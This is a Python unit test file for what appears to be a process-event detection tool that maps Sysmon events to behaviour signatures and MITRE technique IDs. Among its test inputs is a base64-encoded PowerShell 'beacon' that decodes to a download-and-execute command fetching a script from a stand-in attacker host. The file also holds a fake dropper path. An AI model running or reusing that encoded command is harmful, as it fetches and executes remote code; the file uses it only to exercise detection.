import unittest

from argus.events import ProcessEvent
from argus.score import score_event
from argus.signature import BehaviorSignature, signature_id


def ev(**kw):
    d = dict(source="sysmon", event_id=1, timestamp="", pid=1, parent_pid=0,
             image=r"C:\Windows\System32\cmd.exe", command_line="", user="",
             hashes="", integrity="", parent_image="")
    d.update(kw)
    return ProcessEvent(**d)


class TestSignature(unittest.TestCase):
    def test_encoded_powershell_abstracts_to_technique(self):
        e = ev(image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
               command_line="powershell -enc JABhAA==",
               parent_image=r"C:\Windows\System32\cmd.exe")
        sig = BehaviorSignature.from_event(e, score_event(e))
        self.assertIn("T1059.001", sig.techniques)
        self.assertIn("image:shell", sig.structural)
        self.assertIn("path:system", sig.structural)
        self.assertIn("parent:shell", sig.structural)   # cmd.exe is a shell

    def test_dropper_path_and_unknown_image(self):
        e = ev(image=r"C:\Users\a\AppData\Local\Temp\payload.exe",
               command_line="payload.exe --steal")
        sig = BehaviorSignature.from_event(e, score_event(e))
        self.assertIn("path:dropper", sig.structural)
        self.assertIn("image:other", sig.structural)

    def test_signature_id_is_stable_across_paths(self):
        a = BehaviorSignature(techniques=frozenset({"T1105"}),
                              structural=frozenset({"image:shell", "path:system"}),
                              image_base="updater.exe")
        b = BehaviorSignature(techniques=frozenset({"T1105"}),
                              structural=frozenset({"image:shell", "path:system"}),
                              image_base="updater.exe")
        self.assertEqual(signature_id(a), signature_id(b))

    def test_signature_id_differs_by_entity(self):
        a = BehaviorSignature(techniques=frozenset({"T1105"}),
                              structural=frozenset({"image:shell"}), image_base="updater.exe")
        b = BehaviorSignature(techniques=frozenset({"T1105"}),
                              structural=frozenset({"image:shell"}), image_base="svchost.exe")
        self.assertNotEqual(signature_id(a), signature_id(b))

    def test_text_is_readable(self):
        sig = BehaviorSignature(techniques=frozenset({"T1059.001", "T1105"}),
                                structural=frozenset({"image:shell"}),
                                image_base="powershell.exe")
        self.assertIn("T1059.001", sig.text())
        self.assertIn("powershell.exe", sig.text())

    def test_encoded_payload_distinguishes_signatures(self):
        from argus.signature import payload_fingerprint
        demo = payload_fingerprint(
            "powershell -NoP -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABlAG4AYwBvAGQAZQBkAC0AZABlAG0AbwA=")
        beacon = payload_fingerprint(
            "powershell -NoP -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=")
        self.assertTrue(demo.startswith("enc:"))
        self.assertTrue(beacon.startswith("enc:"))
        self.assertNotEqual(demo, beacon)

    def test_plaintext_command_has_no_payload_fingerprint(self):
        from argus.signature import payload_fingerprint
        self.assertEqual(payload_fingerprint("powershell -NoP -Command Get-Process"), "")

    def test_signature_id_differs_by_payload(self):
        a = BehaviorSignature(techniques=frozenset({"T1059.001"}),
                              structural=frozenset({"image:shell", "path:system"}),
                              image_base="powershell.exe", payload="enc:1111")
        b = BehaviorSignature(techniques=frozenset({"T1059.001"}),
                              structural=frozenset({"image:shell", "path:system"}),
                              image_base="powershell.exe", payload="enc:2222")
        self.assertNotEqual(signature_id(a), signature_id(b))


if __name__ == "__main__":
    unittest.main()
